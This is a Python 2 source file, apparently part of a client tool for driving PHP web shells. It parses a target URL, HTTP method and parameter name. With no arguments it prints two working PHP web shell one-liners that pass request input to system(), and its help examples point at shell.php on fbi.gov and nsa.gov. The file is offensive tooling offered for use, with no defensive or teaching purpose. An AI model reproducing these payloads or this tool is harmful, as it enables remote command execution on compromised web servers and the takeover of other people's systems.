from sys import argv
import argparse


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    HOT = '\033[97m'
    END = '\033[0m'


class GetArgs(object):
    if len(argv) <= 1:
        print'''
{hot}-- Command controler for PHP system functions. --
--   Which works for POST and GET requests:    --{end}

{yellow}1-   <?php system($_GET['parameter']); ?>
2-   <?php system($_POST['parameter']); ?>{end}

run {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)

    parser = argparse.ArgumentParser(
            add_help=False,
            usage='%(prog)s -h',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog='''
    Examples:
        python %(prog)s --url http://www.fbi.gov/shell.php?cmd=
        python %(prog)s --url http://www.nsa.gov/shell.php --method POST --parameter cmd
        ''')
    positional = parser.add_argument_group('Positional arguments')
    positional.add_argument('-u', '--url', help='Full URL for the uploaded PHP code', metavar='')
    optional = parser.add_argument_group('Optional arguments')
    optional.add_argument('-h', '--help', action='help', help='Print this help message then exit.')
    optional.add_argument('-m', '--method', dest='method', help='The method used in the uploaded PHP code (eg. post)', metavar='')
    optional.add_argument('-p', '--parameter', dest='parameter', help='Parameter that used in the shell (eg. cmd)', metavar='')
    options = parser.parse_args()
    url = options.url
    method = options.method.lower() if options.method else None
    parameter = options.parameter

getargs = GetArgs()